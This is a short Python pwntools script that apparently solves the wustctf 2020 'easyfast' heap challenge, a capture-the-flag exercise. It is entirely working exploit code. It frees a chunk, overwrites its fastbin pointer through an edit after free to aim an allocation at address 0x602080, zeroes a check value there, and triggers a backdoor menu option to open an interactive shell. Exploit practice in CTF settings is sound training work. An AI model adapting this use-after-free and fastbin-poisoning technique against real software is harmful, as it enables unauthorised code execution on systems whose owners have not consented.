from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/bin/heap23_14_wustctf_2020_easyfast')
elf = ELF('./data/bin/heap23_14_wustctf_2020_easyfast')
libc = elf.libc

def add(size):
    p.recvuntil(b'choice>\n')
    p.sendline(b'1')
    p.recvuntil(b'size>\n')
    p.sendline(str(size))

def delete(index):
    p.recvuntil(b'choice>\n')
    p.sendline(b'2')
    p.recvuntil(b'index>\n')
    p.sendline(str(index))

def edit(index,content):
    p.recvuntil(b'choice>\n')
    p.sendline(b'3')
    p.recvuntil(b'index>\n')
    p.sendline(str(index))
    p.send(content)

def backdoor():
    p.recvuntil(b'choice>\n')
    p.sendline(b'4')

add(0x40);add(0x20);delete(0)#step.1
edit(0,p64(0x602080))#step.2
add(0x40);add(0x40)#step.3
edit(3,p64(0))#step.4
backdoor()#step.5
p.interactive()